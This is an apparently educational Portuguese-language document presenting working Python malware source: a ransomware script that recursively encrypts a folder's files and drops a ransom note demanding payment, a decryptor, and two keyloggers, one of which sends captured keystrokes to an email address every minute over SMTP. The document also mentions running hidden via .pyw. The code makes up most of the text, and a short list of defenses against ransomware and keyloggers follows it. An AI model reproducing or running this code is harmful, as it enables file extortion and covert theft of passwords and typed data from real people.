RANSOMWARE E DESCRIPTOGRAFIA

Este conjunto de scripts demonstra como um Ransomware pode criptografar arquivos de forma simetrica usando uma chave unica e como a posse dessa chave e critica para a recuperacao dos dados.

O script ramsonware.py simula a rotina de ataque. Ele gera uma chave de criptografia, salva-a no disco em um arquivo chamado chave.key, e criptografa recursivamente todos os arquivos dentro do diretorio test\_files.

Codigo de ramsonware.py:

from cryptography.fernet import Fernet
import os

# Gerar e salvar a chave

def gerar\_chave():
chave = Fernet.generate\_key()
with open("chave.key", "wb") as chave\_file:
chave\_file.write(chave)

# Carregar a chave salva

def carregar\_chave():
return open("chave.key", "rb").read()

# Criptografar um unico arquivo

def criptografar\_arquivo(arquivo, chave):
f = Fernet(chave)
with open(arquivo, "rb") as file:
dados = file.read()
dados\_criptografados = f.encrypt(dados)
with open(arquivo, "wb") as file:
file.write(dados\_criptografados)

# Encontrar arquivos para criptografar

def encontrar\_arquivos(diretorio):
lista = []
\# Itera de forma recursiva (os.walk)
for raiz, \_, arquivos in os.walk(diretorio):
for nome in arquivos:
caminho = os.path.join(raiz, nome)
\# Exclui o proprio ransomware e o arquivo de chave
if nome \!= "ramsonware.py" and not nome.endswith(".key"):
lista.append(caminho)
return lista

# Mensagem do resgate

def criar\_mensagem\_resgate():
with open("MENSAGEM\_DE\_RESGATE.txt", "w") as file:
file.write("Seus arquivos foram criptografados\! Envie o pix para mim\!")

# Executar o ransomware

def main():
gerar\_chave()
chave = carregar\_chave()
arquivos = encontrar\_arquivos("test\_files")
for arquivo in arquivos:
criptografar\_arquivo(arquivo, chave)
criar\_mensagem\_resgate()
print("Ransomware executado\!")

if **name** == "**main**":
main()

O script descriptografar.py simula o processo de recuperacao. Ele le a chave criptografica salva (chave.key) e reverte a criptografia em todos os arquivos afetados.

Codigo de descriptografar.py:

from cryptography.fernet import Fernet
import os

def carregar\_chave():
return open("chave.key", "rb").read()

def descriptografar\_arquivo(arquivo, chave):
f = Fernet(chave)
with open(arquivo, "rb") as file:
dados = file.read()
dados\_descriptografados = f.decrypt(dados)
with open(arquivo, "wb") as file:
file.write(dados\_descriptografados)

def encontrar\_arquivos(diretorio):
lista = []
for raiz, \_, arquivos in os.walk(diretorio):
for nome in arquivos:
caminho = os.path.join(raiz, nome)
\# Exclui o proprio script de descriptografia e a chave
if nome \!= "descriptografar.py" and not nome.endswith(".key"):
lista.append(caminho)
return lista

def main():
chave = carregar\_chave()
arquivos = encontrar\_arquivos("test\_files")
for arquivo in arquivos:
descriptografar\_arquivo(arquivo, chave)
print("Arquivos descriptografados\!")

if **name** == "**main**":
main()

KEYLOGGER

Este modulo demonstra como as entradas de teclado podem ser capturadas e registradas usando a biblioteca pynput. O keylogger pode registrar localmente ou enviar os logs por email (exfiltracao). Em ambientes Windows, e possivel rodar o script em segundo plano (invisivel ao usuario) usando a extensao .pyw.

keylogger.py (Registro Local):

from pynput import keyboard

IGNORAR = {keyboard.Key.shift,
keyboard.Key.shift\_r,
keyboard.Key.ctrl\_l,
keyboard.Key.ctrl\_r,
keyboard.Key.alt\_l,
keyboard.Key.alt\_r,
keyboard.Key.caps\_lock,
keyboard.Key.cmd
}

def on\_press(key):
try:
\# Tenta escrever o caractere da tecla
with open("log.txt", "a", encoding="utf-8") as f:
f.write(key.char)

except AttributeError:
    # Lida com teclas nao-caracteres (como Espaco, Enter, etc.)
    with open("log.txt", "a", encoding="utf-8") as f:
        if key == keyboard.Key.space:
            f.write(" ")
        elif key == keyboard.Key.enter:
            f.write("\n")
        elif key == keyboard.Key.tab:
            f.write("\t")
        elif key == keyboard.Key.backspace:
            f.write("[BACKSPACE]")
        elif key == keyboard.Key.esc:
            f.write("[ESC]")
        elif key in IGNORAR:
            pass
        else:
            f.write(f"[{key}]")

# Inicia o listener do teclado

with keyboard.Listener(on\_press=on\_press) as listener:
listener.join()

Keylogger com Exfiltracao por E-mail:

Esta versao atualiza o codigo para acumular a digitacao e envia-la periodicamente (a cada 60 segundos) para um email especifico usando a biblioteca smtplib.

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

EMAIL\_ORIGEM = "seu.email.aqui@gmail.com"
EMAIL\_DESTINO = "email.destino@exemplo.com"
SENHA\_EMAIL = "SUA SENHA/TOKEN AQUI"

log = "" \# Variavel global para armazenar a digitacao

def enviar\_email():
global log
if log:
msg = MIMEText(log)
msg['SUBJECT'] = "Dados pelo keylogger"
msg['From'] = EMAIL\_ORIGEM
msg['To'] = EMAIL\_DESTINO
try:
\# Conexao com o servidor SMTP
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(EMAIL\_ORIGEM, SENHA\_EMAIL)
server.send\_message(msg)
server.quit()
except Exception as e:
print("Erro ao enviar:", e)

log = "" # Limpa o log apos o envio

# Agenda o proximo envio em 60 segundos
Timer(60, enviar_email).start()

def on\_press(key):
global log
try:
log += key.char
except AttributeError:
if key == keyboard.Key.space:
log += " "
elif key == keyboard.Key.enter:
log += "\\n"
elif key == keyboard.Key.backspace:
log += "[\<]"
else:
pass

# Inicia o listener e agenda o primeiro envio

with keyboard.Listener(on\_press=on\_press) as listener:
enviar\_email()
listener.join()

MEDIDAS DE SEGURANCA CONTRA RANSOMWARE E KEYLOGGERS

A defesa contra essas ameacas requer uma abordagem multifacetada, combinando boas praticas de usuario, medidas tecnicas e vigilancia constante.

PROTECAO CONTRA RANSOMWARE

  - Backup 3-2-1: Mantenha copias de seguranca de seus dados importantes. O ideal e seguir a regra 3-2-1: 3 copias, em 2 tipos de midia diferentes, com 1 copia off-site (desconectada ou na nuvem).
  - Atualizacao de Sistemas: Mantenha o Sistema Operacional e todos os softwares atualizados. As atualizacoes corrigem falhas de seguranca (vulnerabilidades) que os malwares exploram.
  - Antivirus e Firewall: Utilize solucoes de seguranca de endpoint (Antivirus/Antimalware) com protecao em tempo real e mantenha o firewall ativo.
  - Zero Confianca: Nunca clique em links ou abra anexos de e-mails suspeitos ou nao solicitados. A Engenharia Social (phishing) e o principal vetor de infeccao.
  - Contas de Usuario: Evite usar uma conta de Administrador para tarefas cotidianas. Use contas padrao para limitar o potencial de dano de um malware.
  - Nao Pague o Resgate: Pagar o resgate financia futuros ataques e nao garante a recuperacao dos dados.

PROTECAO CONTRA KEYLOGGERS

  - Autenticacao de Dois Fatores (2FA/MFA): Sempre ative o 2FA em suas contas mais importantes. Mesmo que um keylogger roube sua senha, o atacante precisara do segundo fator para acessar a conta.
  - Teclado Virtual: Para digitar senhas criticas (em bancos, por exemplo), use o teclado virtual do sistema operacional. Isso dribla a maioria dos keyloggers baseados na captura de eventos de teclado fisico.
  - Gerenciadores de Senhas: Use um Gerenciador de Senhas. Ao copiar e colar ou usar o preenchimento automatico a senha, voce evita a digitacao manual, impedindo a captura pelo keylogger.
  - Inspecao de Hardware: Keyloggers podem ser fisicos. Inspecione periodicamente os cabos e portas USB em busca de dispositivos suspeitos.
  - Fontes Confiaveis: Nunca instale software ou extensoes de navegador de fontes desconhecidas ou nao oficiais, pois elas sao frequentemente usadas para disfarcar keyloggers e outros spywares.
  - Monitoramento de Rede: Fique atento a atividades anormais de rede, como a tentativa de conexao com um servidor desconhecido, que pode ser detectada por firewalls ou ferramentas de monitoramento.
